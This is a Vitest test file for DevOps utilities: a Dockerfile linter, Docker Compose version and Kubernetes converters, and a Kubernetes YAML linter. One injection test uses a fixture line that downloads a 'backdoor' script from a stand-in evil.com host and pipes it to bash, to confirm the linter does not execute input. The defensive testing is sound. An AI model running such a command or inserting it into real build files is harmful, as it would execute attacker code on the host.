import { describe, it, expect } from 'vitest';
import {
  lintDockerfile,
  dockerComposeV2ToV3,
  dockerComposeToKubernetes,
  kubernetesToDockerCompose,
  lintKubernetesYaml,
} from '../src/data-converters/devops';

// ═══════════════════════════════════════════════
// Dockerfile Linting
// ═══════════════════════════════════════════════

describe('lintDockerfile', () => {
  const goodDockerfile = `FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --production
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]`;

  it('valid Dockerfile passes', () => {
    const r = JSON.parse(lintDockerfile(goodDockerfile));
    expect(r.valid).toBe(true);
  });

  it('detects :latest tag', () => {
    const r = JSON.parse(lintDockerfile('FROM node:latest\nRUN echo hi'));
    expect(r.issues.some((i: { message: string }) => i.message.includes('latest'))).toBe(true);
  });

  it('detects missing FROM', () => {
    const r = JSON.parse(lintDockerfile('RUN echo hi'));
    expect(r.valid).toBe(false);
    expect(r.issues.some((i: { message: string }) => i.message.includes('FROM'))).toBe(true);
  });

  it('detects ADD that should be COPY', () => {
    const r = JSON.parse(lintDockerfile('FROM node:20\nADD . /app'));
    expect(r.issues.some((i: { message: string }) => i.message.includes('COPY'))).toBe(true);
  });

  it('allows ADD for tar files', () => {
    const r = JSON.parse(lintDockerfile('FROM node:20\nADD app.tar.gz /app'));
    expect(r.issues.some((i: { message: string }) => i.message.includes('COPY'))).toBe(false);
  });

  it('detects relative WORKDIR', () => {
    const r = JSON.parse(lintDockerfile('FROM node:20\nWORKDIR app'));
    expect(r.issues.some((i: { message: string }) => i.message.includes('absolute'))).toBe(true);
  });

  it('suggests combining consecutive RUN', () => {
    const dockerfile = 'FROM node:20\nRUN apt-get update\nRUN apt-get install -y curl';
    const r = JSON.parse(lintDockerfile(dockerfile));
    expect(r.issues.some((i: { message: string }) => i.message.includes('combining'))).toBe(true);
  });

  it('skips comment lines', () => {
    const dockerfile = 'FROM node:20\n# This is a comment\nRUN echo hi';
    const r = JSON.parse(lintDockerfile(dockerfile));
    expect(r.valid).toBe(true);
  });

  it('ARG before FROM is valid', () => {
    const dockerfile = 'ARG VERSION=20\nFROM node:${VERSION}';
    const r = JSON.parse(lintDockerfile(dockerfile));
    expect(r.valid).toBe(true);
  });

  // Injection: Dockerfile with command injection attempt
  it('does not execute injected RUN commands', () => {
    const dockerfile = 'FROM node:20\nRUN $(curl http://evil.com/backdoor.sh | bash)';
    const r = JSON.parse(lintDockerfile(dockerfile));
    // linter just parses, doesn't execute — should return valid
    expect(r).toBeDefined();
    expect(typeof r.valid).toBe('boolean');
  });
});

// ═══════════════════════════════════════════════
// Docker Compose v2 → v3
// ═══════════════════════════════════════════════

describe('dockerComposeV2ToV3', () => {
  it('updates version string', () => {
    const v2 = `version: '2'\nservices:\n  web:\n    image: nginx`;
    const r = dockerComposeV2ToV3(v2);
    expect(r).toContain("'3.8'");
    expect(r).not.toMatch(/version:\s*['"]?2/);
  });
  it('preserves services', () => {
    const v2 = `version: '2'\nservices:\n  web:\n    image: nginx`;
    const r = dockerComposeV2ToV3(v2);
    expect(r).toContain('web:');
    expect(r).toContain('image: nginx');
  });
});

// ═══════════════════════════════════════════════
// Docker Compose ↔ Kubernetes
// ═══════════════════════════════════════════════

describe('dockerComposeToKubernetes', () => {
  const compose = `version: '3'
services:
  web:
    image: nginx:1.25
    ports:
      - "8080:80"
    environment:
      - NODE_ENV=production`;

  it('generates K8s deployment', () => {
    const r = dockerComposeToKubernetes(compose, 'web');
    expect(r).toContain('apiVersion: apps/v1');
    expect(r).toContain('kind: Deployment');
    expect(r).toContain('web');
  });
  it('includes image', () => {
    const r = dockerComposeToKubernetes(compose, 'web');
    expect(r).toContain('nginx');
  });
});

describe('kubernetesToDockerCompose', () => {
  const k8sYaml = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  template:
    spec:
      containers:
        - name: myapp
          image: myapp:1.0
          ports:
            - containerPort: 8080`;

  it('generates compose with services', () => {
    const r = kubernetesToDockerCompose(k8sYaml);
    expect(r).toContain('version:');
    expect(r).toContain('services:');
    expect(r).toContain('image:');
  });
});

// ═══════════════════════════════════════════════
// Kubernetes YAML Linting
// ═══════════════════════════════════════════════

describe('lintKubernetesYaml', () => {
  const validK8s = `apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp
spec:
  template:
    spec:
      containers:
        - name: myapp
          image: myapp:1.0
          resources:
            limits:
              memory: "128Mi"
              cpu: "500m"
          livenessProbe:
            httpGet:
              path: /health
              port: 8080`;

  it('valid K8s passes', () => {
    const r = JSON.parse(lintKubernetesYaml(validK8s));
    expect(r.valid).toBe(true);
  });

  it('detects missing apiVersion', () => {
    const r = JSON.parse(lintKubernetesYaml('kind: Deployment\nmetadata:\n  name: x'));
    expect(r.issues.some((i: { message: string }) => i.message.includes('apiVersion'))).toBe(true);
  });

  it('detects missing kind', () => {
    const r = JSON.parse(lintKubernetesYaml('apiVersion: v1\nmetadata:\n  name: x'));
    expect(r.issues.some((i: { message: string }) => i.message.includes('kind'))).toBe(true);
  });

  it('detects missing metadata', () => {
    const r = JSON.parse(lintKubernetesYaml('apiVersion: v1\nkind: Pod'));
    expect(r.issues.some((i: { message: string }) => i.message.includes('metadata'))).toBe(true);
  });

  it('warns about :latest tag', () => {
    const yaml = 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\nspec:\n  containers:\n    - image: nginx:latest';
    const r = JSON.parse(lintKubernetesYaml(yaml));
    expect(r.issues.some((i: { message: string }) => i.message.includes('latest'))).toBe(true);
  });

  it('warns about missing resource limits', () => {
    const yaml = 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\nspec:\n  containers:\n    - image: nginx:1.25';
    const r = JSON.parse(lintKubernetesYaml(yaml));
    expect(r.issues.some((i: { message: string }) => i.message.includes('resource'))).toBe(true);
  });

  it('warns about hostNetwork', () => {
    const yaml = 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\nspec:\n  hostNetwork: true';
    const r = JSON.parse(lintKubernetesYaml(yaml));
    expect(r.issues.some((i: { message: string }) => i.message.includes('hostNetwork'))).toBe(true);
  });

  it('warns about privileged containers', () => {
    const yaml = 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\nspec:\n  containers:\n    - securityContext:\n        privileged: true';
    const r = JSON.parse(lintKubernetesYaml(yaml));
    expect(r.issues.some((i: { message: string }) => i.message.includes('Privileged'))).toBe(true);
  });

  it('suggests health probes', () => {
    const yaml = 'apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\nspec:\n  containers:\n    - image: nginx:1.25';
    const r = JSON.parse(lintKubernetesYaml(yaml));
    expect(r.issues.some((i: { message: string }) => i.message.includes('health probes'))).toBe(true);
  });
});
